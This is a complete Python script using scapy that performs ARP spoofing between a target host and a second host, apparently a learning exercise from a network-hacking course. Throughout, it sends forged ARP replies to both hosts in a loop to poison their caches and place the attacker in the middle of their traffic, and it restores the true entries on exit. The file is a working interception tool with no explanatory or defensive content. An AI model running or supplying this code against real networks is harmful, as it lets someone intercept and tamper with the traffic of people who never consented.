#!/usr/bin/env python
import scapy.all as scapy
import time
import argparse

def argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Enter the target IP")
    parser.add_argument("-s", "--spoof", help="Enter the spoof IP")
    args=parser.parse_args()
    target_ip, spoof_ip = args.target,args.spoof
    return target_ip, spoof_ip

def get_mac(ip):
    return scapy.getmacbyip(ip)

def spoofing(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_res = scapy.ARP(op=2 , pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_res, verbose=False)

def restore(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    arp_res = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(arp_res, verbose=False, count=7)

arp_packet_count = 0
(target_ip, spoof_ip) = argument()

try:
    while True:
        spoofing(target_ip, spoof_ip)
        spoofing(spoof_ip, target_ip)
        arp_packet_count = arp_packet_count + 2
        print("\r [+] Packets Send = " + str(arp_packet_count),end="")
        time.sleep(2)
except:
     print("\n [+] Execution Ended ")
     restore(target_ip, spoof_ip)
     restore(spoof_ip, target_ip)